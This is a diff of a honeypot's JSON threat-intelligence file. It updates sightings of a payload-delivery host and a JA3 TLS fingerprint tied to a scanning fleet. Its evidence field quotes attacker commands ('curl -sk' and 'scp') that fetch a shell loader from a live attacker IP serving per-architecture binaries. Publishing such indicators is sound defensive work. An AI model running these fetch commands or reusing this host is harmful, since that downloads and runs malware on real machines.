@@ -1,12 +1,13 @@
 {
   "note": "Attacker infrastructure observed on this honeypot. An address inside a payload URL is the attacker's own host, not a scanner's source; source addresses are never published. No attribution to a person is implied.",
-  "updated": "2026-11-02",
+  "updated": "2026-11-07",
   "c2": [
     {
       "host": "217.60.102.5",
       "url": "https://217.60.102.5/sh",
       "kind": "payload-delivery",
       "first_seen": "2026-10-27T21:51:25Z",
+      "last_seen": "2026-11-06T13:10:09Z",
       "evidence": "fetched by a bot that planted an SSH key and ran 'scp dlr@217.60.102.5:sh', and separately by another host running 'curl -sk https://217.60.102.5/sh'",
       "serves": "a shell loader (see payloads) and per-architecture binaries: /clean, /x86_64, /i686, /aarch64, /arm7, /riscv"
     }
@@ -35,7 +36,8 @@
     {
       "type": "ja3",
       "value": "8d9f7747675e24454cd9b7ed35c58707",
-      "seen_on": "54 addresses across Datacamp Limited and Kyonix Networks",
+      "seen_on": "56 addresses across Datacamp Limited, Netiface, Kyonix Networks and M247 Europe",
+      "last_seen": "2026-11-07T16:04:33Z",
       "note": "TLS client of the fleet that used the published AWS canary: 53 of the 64 addresses that swept the honeypot from one /24 present it, and it barely appears outside that fleet, so it identifies the client rather than a host"
     }
   ]
